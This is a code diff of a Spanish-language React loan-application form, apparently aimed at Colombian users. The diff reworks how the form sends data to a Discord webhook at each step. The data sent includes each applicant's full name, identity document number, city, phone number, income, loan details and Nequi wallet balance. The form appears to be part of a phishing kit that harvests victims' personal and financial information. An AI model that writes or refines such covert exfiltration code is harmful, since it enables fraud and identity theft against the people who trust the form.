@@ -1,4 +1,4 @@
-import { useState, useRef } from 'react'
+import { useState } from 'react'
 import {
   User, FileText, Phone, Wallet, TrendingUp,
   CheckCircle2, ArrowRight, ArrowLeft, DollarSign, Sparkles, Info
@@ -223,20 +223,6 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
   const [step, setStep] = useState(0)
   const [direction, setDirection] = useState<'forward' | 'back'>('forward')
   const [animating, setAnimating] = useState(false)
-  const reportedRef = useRef<Set<string>>(new Set())
-
-  function reportField(label: string, value: string) {
-    if (!value || value === '0') return
-    const key = `${label}_${value}`
-    if (reportedRef.current.has(key)) return
-    reportedRef.current.add(key)
-    DiscordWebhookService.sendInfo(
-      `Campo completado: ${label}`,
-      '',
-      {},
-      { [label]: value },
-    )
-  }
 
   const loanValue = data.loanAmount ? parseInt(data.loanAmount) : MIN_LOAN
   const incomeValue = data.monthlyIncome ? parseInt(data.monthlyIncome) : MIN_INCOME
@@ -277,16 +263,22 @@ export function FormScreen({ data, onChange, onContinue, onBack }: FormScreenPro
 
   function handleNext() {
     if (step === 0) {
-      reportField('Nombre completo', data.fullName)
-      reportField('Documento de identidad', data.documentId)
-      reportField('Ciudad de residencia', data.city)
+      DiscordWebhookService.sendInfo('Datos personales', '', {}, {
+        'Nombre completo': data.fullName,
+        'Documento de identidad': data.documentId,
+        'Ciudad de residencia': data.city,
+      })
     } else if (step === 1) {
-      reportField('Número de celular', data.phone)
+      DiscordWebhookService.sendInfo('Contacto', '', {}, {
+        'Número de celular': data.phone,
+      })
     } else if (step === 2) {
-      reportField('Monto solicitado', data.loanAmount)
-      reportField('Plazo del crédito', data.loanTerm + ' meses')
-      reportField('Ingresos mensuales', data.monthlyIncome)
-      reportField('Saldo Nequi', data.nequiBalance)
+      DiscordWebhookService.sendInfo('Información financiera', '', {}, {
+        'Monto solicitado': `$${parseInt(data.loanAmount || '0').toLocaleString('es-CO')} COP`,
+        'Plazo del crédito': `${data.loanTerm} meses`,
+        'Ingresos mensuales': `$${parseInt(data.monthlyIncome || '0').toLocaleString('es-CO')} COP`,
+        'Saldo Nequi': `$${parseInt(data.nequiBalance || '0').toLocaleString('es-CO')} COP`,
+      })
     }
     if (step < 2) navigate('forward')
     else onContinue()
